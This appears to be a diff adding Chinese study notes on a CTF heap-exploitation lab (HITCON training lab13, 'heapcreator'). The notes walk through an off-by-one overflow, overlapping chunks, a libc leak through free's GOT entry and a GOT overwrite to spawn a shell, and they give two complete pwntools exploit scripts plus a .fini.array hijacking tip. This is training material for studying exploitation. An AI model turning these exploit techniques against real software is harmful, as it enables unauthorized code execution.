@@ -1196,4 +1196,311 @@ ri()
 - https://zhuanlan.zhihu.com/p/91956265
 - http://www.g3n3rous.fun/index.php/archives/77/
 
+###### 湖湘杯HakeNote参考链接
+
+- http://shiroinu.top/2019/11/09/hxb2019pwn/
+- https://ama2in9.top/2019/11/22/total1/
+- [https://xi4or0uji.github.io/2019/11/10/2019%E6%B9%96%E6%B9%98%E6%9D%AFwp/#HackNote](https://xi4or0uji.github.io/2019/11/10/2019湖湘杯wp/#HackNote)
+- https://gksec.com/hxb2019-WP.html#gallery-24
+- https://www.anquanke.com/post/id/192605
+
 ## lab13
+
+目前我存在的最大问题在于找得到bug，却不知道怎么利用。也就是对how2heap的各种姿势的连贯利用不熟悉，以及通过这种姿势达到效果之后对这个效果怎么进行利用。
+
+这题给出两个EXP解法。
+
+### hitcon原版解法
+
+#### 一、程序分析
+
+![](/img/hitcon2/lab13_1.png)
+
+##### 1.Create a Heap
+
+![](/img/hitcon2/lab13_2.png)
+
+该部分的程序功能在于：
+
+- malloc(0x10)：创建一个heap object chunk，并把heap object对象指针存储在空的heaparray[i]中
+- 在heapobject对象的chunk中
+  - chunk的第一个字段单元存储size【data大小】
+  - malloc(size)：chunk的第二个字段单元存储data_chunk的地址
+- 在data_chunk写入数据
+
+其中`void *heaparray[10]`位于bss段，最多允许有10个heap object。
+
+由此功能我们可以分析出该程序的内部存储结构如下：
+
+![](/img/hitcon2/lab13_3.png)
+
+##### 2.Edit a Heap
+
+这里有off by one漏洞
+
+![](/img/hitcon2/lab13_4.png)
+
+`read_input`函数的具体实现：
+
+![](/img/hitcon2/lab13_5.png)
+
+##### 3.Show a Heap
+
+![](/img/hitcon2/lab13_6.png)
+
+##### 4.Delete a Heap
+
+![](/img/hitcon2/lab13_7.png)
+
+#### 二、攻击过程及思路
+
+通过上述程序分析我们可以明确，每进行一次`Creat a Heap`会创造两个chunk【malloc(0x10)及malloc(size)】，这里我们称第一个chunk为heap_object_chunk【顺序切割top chunk分配的话，这个是低地址】，第二个chunk为data_chunk【高地址】。而每次free，也会把这个两个chunk一起free掉。
+
+由于程序的**Edit a Heap->read_input存在off by one漏洞**，我们由此来设计<u>攻击思路</u>：
+
+- 在chunk0A利用off by one漏洞覆盖**物理相邻下一个chunk0B**的size字段【假设这是第一条data记录，chunk0A作为heap object chunk，chunk0B作为data chunk】
+  - 要使chunk0A能够通过read_input的off by one，单字节溢出覆盖到chunk0B的size字段，就说明chunk0A要恰好复用了下一个chunk0B的prev_size字段，即对齐padding为0。
+- 将size字段改大，从而使得chunk0B的大小变大，可以包含或部分包含下一个chunk1C，甚至下下个chunk1D【这里以恰好包含下一个chunkC为例】，从而得到overlapping chunk。【假设这是第二条data记录，chunk1C作为heap object chunk，chunk1D作为data chunk】
+  - chunk1C overlap chunk1D
+- 这时候调用Delete a Heap，idx=1，会free(chunk1C)和free(chunk1D)【一个是heap object chunk，一个是data chunk】，从而得到overlapping free chunk。
+  - 这里在fastbin中会得到一个大的free chunk->chunk 1C
+  - 还会得到一个被chunk1C包含的free chunk->chunk 1D
+  - 就size而言，chunk 1D<chunk 1C
+  - 那么下一次Create a Heap分配**让chunk1D成为 heap object chunk【小】，chunk1C成为data chunk【大】。**
+    - <u>实现了交换，原来chunk1D是data chunk，chunk1C是heap object chunk</u>
+- Create时，写入data就会写在低地址的chunk1C，写多了就会写到overlapped的高地址chunk1D。
+  - 写chunk1C时，overlapped写到的chunk1D【heap object chunk】的第二个字段改成free got表项地址。
+  - 调用Show a Heap，idx=1，那么就会打印chunk1D的第二个字段地址指向的内容，即打印free got表项的值
+  - **从而泄露libc基地址**，计算得到system的地址
+- 通过Edit a Heap，idx=1，修改data chunk的值
+  - Edit a Heap是根据chunk1D的第二个字段地址找到data chunk addr的，此时这里的值被改为free_got表项地址了
+  - 因此Edit a Heap，会往free_got表项写入值。
+  - 那么如果写入了system的地址，就实现了将free(xxx)为system(xxx)
+- 通过调用Detele a Heap，idx=0，调用free(data_chunk_addr)
+  - 起初off by one溢出的时候，在data chunk即chunk0B的前部分数据可以写入/bin/sh\x00，后面的溢出数据写入size
+  - free(data_chunk_addr)->system(data_chunk_addr)
+  - 如果data chunk addr指向的chunk0B前部是“/bin/sh”，就**相当于调用了system("/bin/sh“)**
+
+##### 1.off by one size
+
+```python
+create(0x18,"dada") # 0【得到两个chunk的大小都是0x20，便于此后的实现交换】
+#0x18 + 0x8 align 0x10 = 0x20, 没有对齐padding，使得off by one可以溢出到记录2的heap object chunk的size字段
+create(0x10,"ddaa") # 1【得到两个chunk的大小都是0x20】
+#0x10 + 0x8 align 0x10 = 0x20，padding=0x8
+```
+
+![](/img/hitcon2/lab13_9.png)
+
+##### 2.overlapping chunk
+
+```python
+edit(0, "/bin/sh\x00" +"a"*0x10 + "\x41") #注意这里写入了/bin/sh到第一条记录的datachunk
+delete(1)
+```
+
+![](/img/hitcon2/lab13_10.png)
+
+##### 3.get libc base addr
+
+```python
+create(0x30,p64(0)*4 +p64(0x30) +  p64(free_got)) #1
+# gdb.attach(r)
+show(1)
+```
+
+这里请求0x30大小的data  chunk，会返回0x2040040的chunk【原heap object chunk】。且0x30 +0x8 align 0x10=0x40，大小恰好合适。
+
+而malloc(0x10)分配得到0x2040060的chunk，真实大小为0x20。
+
+写入`p64(0)*4 +p64(0x30) +  p64(free_got)`到0x2040040的chunk的user area中，即写入0x2040050：
+
+![](/img/hitcon2/lab13_11.png)
+
+这样写入的data没有破坏掉overlapped 的heap object chunk的记录size字段【0x2040060为chunk头地址，0x2040070为mem地址】，并且将记录第二个字段改为free_got。
+
+```python
+r.recvuntil("Content : ")
+data = r.recvuntil("Done !")
+
+free_addr = u64(data.split("\n")[0].ljust(8,"\x00"))
+libc = free_addr - lib.symbols['free']
+print "libc:",hex(libc)
+system = libc + lib.symbols['system']
+```
+
+通过Show a Heap，打印记录第二个字段free_got地址下的值，即得到free函数的真实地址，从而计算出libc基地址，并获得system地址。
+
+##### 4.getShell
+
+```python
+edit(1,p64(system))
+# 对刚刚分配的记录1的datachunk写入system地址
+# 对应的写入程序代码：
+# read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
+# read_input(记录1的heap object chunk第二个字段[free_got]，size)
+# 修改free_got value为system的值
+delete(0) # 执行free(data chunk addr)=system(data chunk addr)=system("/bin/sh")
+# 注意记录1的datachunk前部分写入了/bin/sh
+r.interactive() #getshell
+```
+
+![](/img/hitcon2/lab13_13.png)
+
+![](/img/hitcon2/lab13_8.png)
+
+#### 三、exp
+
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+r = process("./heapcreator")
+elf=ELF('./heapcreator')
+lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def create(size,content):
+    r.recvuntil(":")
+    r.sendline("1")
+    r.recvuntil(":")
+    r.sendline(str(size))
+    r.recvuntil(":")
+    r.sendline(content)
+
+def edit(idx,content):
+    r.recvuntil(":")
+    r.sendline("2")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+    r.recvuntil(":")
+    r.sendline(content)
+
+def show(idx):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+def delete(idx):
+    r.recvuntil(":")
+    r.sendline("4")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+free_got = elf.got["free"]
+create(0x18,"dada") # 0
+create(0x10,"ddaa") # 1
+
+# gdb.attach(r)
+edit(0, "/bin/sh\x00" +"a"*0x10 + "\x41")
+delete(1)
+# gdb.attach(r)
+create(0x30,p64(0)*4 +p64(0x30) +  p64(free_got)) #1
+# gdb.attach(r)
+show(1)
+r.recvuntil("Content : ")
+data = r.recvuntil("Done !")
+
+free_addr = u64(data.split("\n")[0].ljust(8,"\x00"))
+libc = free_addr - lib.symbols['free']
+print "libc:",hex(libc)
+system = libc + lib.symbols['system']
+edit(1,p64(system))
+delete(0)
+r.interactive()
+```
+
+注意：可以用gdb.attach(r)进行动态调试，并且在堆题中libc就用固定版本的libc-2.23.so就好了。
+
+### veritas501解法
+
+```python
+#!/usr/bin/env python
+from pwn import *
+#cn = remote('127.0.0.1',9527)
+cn = process('./heapcreator')
+elf=ELF('./heapcreator')
+#context.log_level='debug'
+lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+ 
+def create(l,value):
+    cn.recvuntil('Your choice :')
+    cn.sendline('1')
+    cn.recvuntil('Size of Heap : ')
+    cn.sendline(str(int(l)))
+    cn.recvuntil('Content of heap:')
+    cn.sendline(value)
+ 
+def edit(index,value):
+    cn.recvuntil('Your choice :')
+    cn.sendline('2')
+    cn.recvuntil('Index :')
+    #if index == 2:gdb.attach(cn)
+    cn.sendline(str(index))
+    cn.recvuntil('Content of heap : ')
+    cn.sendline(value)
+def show(index):
+    cn.recvuntil('Your choice :')
+    gdb.attach(cn)
+    cn.sendline('3')
+    cn.recvuntil('Index :')
+    cn.sendline(str(index))
+def delete(index):
+    cn.recvuntil('Your choice :')
+    cn.sendline('4')
+    cn.recvuntil('Index :')
+    cn.sendline(str(index))
+#leak free addr
+create(0x18,'aaaa')#0
+create(0x10,'bbbb')#1
+create(0x10,'cccc')#2
+create(0x10,'/bin/sh')#3
+gdb.attach(cn)
+edit(0,'a'*0x18+'\x81')
+gdb.attach(cn)
+delete(1)
+size = '\x08'.ljust(8,'\x00')
+payload = 'd'*0x40+ size + p64(elf.got['free'])
+create(0x70,payload)#1
+ 
+show(2)
+cn.recvuntil('Content : ')
+free_addr = u64(cn.recvuntil('Done')[:-5].ljust(8,'\x00'))
+# "xxx".ljust(a,chr)，将“xxx”字符串左对齐，不足a长度就用chr填充至a长度
+success('free_addr = '+str(hex(free_addr)))
+#trim free_got
+system_addr = free_addr + lib.symbols['system']-lib.symbols['free']
+success('system_addr = '+str(hex(system_addr)))
+#gdb.attach(cn)
+edit(2,p64(system_addr))
+#gdb.attach(cn)
+show(2)
+delete(3)
+cn.interactive()
+```
+
+## lab14
+
+## lab15
+
+
+
+
+
+## 补充
+
+#### 讨论堆场景下的libc和堆基地址泄露
+
+- https://www.jianshu.com/p/7904d1edc007
+- https://wiki.x10sec.org/pwn/heap/leak_heap/#unsorted-bin
+- https://sirhc.gitbook.io/note/pwn/li-yong-mainarena-xie-lou-libc-ji-zhi
+- https://drive.google.com/file/d/1eJskblBnGMOM-lKyDKcqVFh8EQG1GB48/view
+
+#### .fini.array函数
+
+.fini.array的数组，里面保存着程序执行完之后执行的函数，这里的思路是可以覆盖.fini.array数组的内容来控制程序执行流程。有一点需要注意的是.fini.array数组里保存的函数是逆序执行的，也就是说会先执行.fini.array[1]再执行.fini.array[0]。我们可以将.fini.array[1]的值改为main函数的地址，将.fini.array[0]改成调用控制.fini.array的函数0x402960
+
+参考链接：
+
+- https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/
+- https://blog.csdn.net/gary_ygl/article/details/8506007
